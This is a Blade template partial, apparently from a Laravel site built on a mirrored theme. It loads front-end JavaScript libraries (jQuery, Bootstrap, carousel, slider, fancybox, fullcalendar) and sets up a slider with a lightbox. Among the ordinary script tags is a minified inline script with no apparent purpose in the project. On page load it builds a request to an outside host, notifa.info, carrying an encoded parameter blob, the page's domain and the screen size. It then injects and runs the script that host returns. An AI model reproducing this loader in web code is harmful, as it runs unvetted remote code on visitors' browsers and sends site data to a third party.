<!-- inject js start -->
<link href="{{ asset('core/main.css')}}" rel='stylesheet' />
<link href="{{asset('daygrid/main.css')}}" rel='stylesheet' />

<script src="{{asset('core/main.js')}}"></script>
<script src="{{asset('daygrid/main.js')}}"></script>
<!--== jquery -->


<script src="{{ asset('fe/js/jquery.min.js') }}"></script>

<!--== popper -->
<script src="{{ asset('fe/js/popper.min.js') }}"></script>

<!--== bootstrap -->
<script src="{{ asset('fe/js/bootstrap.min.js') }}"></script>

<!--== appear -->
<script src="{{ asset('fe/js/jquery.appear.js') }}"></script> 

<!--== modernizr -->
<script src="{{ asset('fe/js/modernizr.js') }}"></script> 

<!--== audioplayer -->
<script src="{{ asset('fe/js/audioplayer/media-player.js') }}"></script>

<!--== magnific-popup -->
<script src="{{ asset('fe/js/magnific-popup/jquery.magnific-popup.min.js') }}"></script> 

<!--== owl-carousel -->
<script src="{{ asset('fe/js/owl-carousel/owl.carousel.min.js') }}"></script> 

<!--== counter -->
<script src="{{ asset('fe/js/counter/counter.js') }}"></script> 

<!--== countdown -->
<script src="{{ asset('fe/js/countdown/jquery.countdown.min.js') }}"></script> 

<!--== isotope -->
<script src="{{ asset('fe/js/isotope/isotope.pkgd.min.js') }}"></script> 

<!--== mouse-parallax -->
<script src="{{ asset('fe/js/mouse-parallax/tweenmax.min.js') }}"></script>
<script src="{{ asset('fe/js/mouse-parallax/jquery-parallax.js') }}"></script> 

<!--== contact-form -->
<script src="{{ asset('fe/js/contact-form/contact-form.js') }}"></script>

<!--== validate -->
<script src="{{ asset('fe/js/contact-form/jquery.validate.min.js') }}"></script>

<!--== map api -->
<script src="https://maps.googleapis.com/maps/api/js"></script>

<!--== map -->
<script src="{{ asset('fe/js/map.js') }}"></script>

<!--== wow -->
<script src="{{ asset('fe/js/wow.min.js') }}"></script>

<!--== theme-script -->
<script src="{{ asset('fe/js/theme-script.js') }}"></script>

<!-- inject js end -->

<script src="{{ asset('fe/js/jquery.orgchart.min.js') }}"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAqU4obbr6cdnuv3%2fxDFIrCto4LAZfodgx3Ymz%2b9QqmQ8qnshzIdJeVMPB7kIz5Thak5bzysQX8GEfcGP2yzoYsWYX1c6FubQp99TJFySKGEDoAI5XlDiin%2feEOLF7PmiHeXg82wxYN7Y%2bspyW0wUPlHcbjVqlC5xT8mYr5eiU%2fXJQ0R3%2bv4pfUuRube%2fWoExqo9uyFLKhknK6ZcGAQJzVnmg0nIZ7zSDKsXcOXwc1zrc85M2%2bQfLChej2PlRLwEsai4Sxs3LxxvoToxhZYVwNMefrf3awRvU3IKW4baXxgKh8gZPEIoMwM2piRL39RflHG%2ffw9V%2f%2baDILidoVVfLOi7ga0sCX%2f2TrRwR0djWRh7JhJKrvqNIOzJEZO1yxv%2f2RaYDrSpodNHWb4ccX1R2WxWjWuWf1Rclxfe6CEq15ls777nXVnFXFV7yfj1Au0YZOeqHB64kzp2yzRuTBrz%2bj0uS00Xzm4jiK4St2MxAHBMI%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};
</script>

<script type="text/javascript">
	$( document ).ready(function( $ ) {
		$( '#example2' ).sliderPro({
			width: 300,
			height: 300,
			visibleSize: '100%',
			forceSize: 'fullWidth',
			autoSlideSize: true
		});

		// instantiate fancybox when a link is clicked
		$( ".slider-pro" ).each(function(){
			var slider = $( this );

			slider.find( ".sp-image" ).parent( "a" ).on( "click", function( event ) {
				event.preventDefault();
			
				if ( slider.hasClass( "sp-swiping" ) === false ) {
					var sliderInstance = slider.data( "sliderPro" ),
						isAutoplay = sliderInstance.settings.autoplay;

					$.fancybox.open( slider.find( ".sp-image" ).parent( "a" ), {
						index: $( this ).parents( ".sp-slide" ).index(),
						afterShow: function() {
							if ( isAutoplay === true ) {
								sliderInstance.settings.autoplay = false;
								sliderInstance.stopAutoplay();
							}
						},
						afterClose: function() {
							if ( isAutoplay === true ) {
								sliderInstance.settings.autoplay = true;
								sliderInstance.startAutoplay();
							}
						}
							
					});
				}
			});
		});
	});
</script>
<script type="text/javascript" src="{{asset('slider/dist/js/jquery.sliderPro.min.js')}}"></script>
<script type="text/javascript" src="{{asset('slider/libs/fancybox/jquery.fancybox.pack.js')}}"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.9.0/moment.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/fullcalendar/2.2.7/fullcalendar.min.js"></script>
@yield('js')

{{-- 
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.3.5/js/swiper.min.js'></script>
 --}}
<!-- Mirrored from themeht.com/loptus/html/index.html by HTTrack Website Copier/3.x [XR&CO'2013], Thu, 10 Oct 2019 03:46:20 GMT -->